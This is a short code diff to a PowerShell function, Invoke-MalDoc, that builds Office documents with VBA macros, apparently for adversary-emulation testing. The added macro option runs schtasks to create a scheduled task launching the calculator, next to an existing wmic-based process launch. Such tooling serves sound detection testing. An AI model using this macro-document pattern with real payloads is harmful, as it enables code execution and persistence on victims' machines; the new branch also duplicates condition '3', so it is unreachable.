@@ -16,6 +16,9 @@ function Invoke-MalDoc($macro_choice, $office_version, $office_product) {
     elseif ($macro_choice -eq "3"){
         $macro_code = "Sub Test()`n Shell `"wmic.exe process call create calc`" `nEnd Sub"  
     } 
+    elseif ($macro_choice -eq "3"){
+        $macro_code = "Sub Test()`n Shell `"Schtasks /create /tn "calculator" /tr c:\Windows\System32\Calc /sc once /st 00:00`" `nEnd Sub"  
+    } 
 
     
     if ($office_product -eq "Word") {
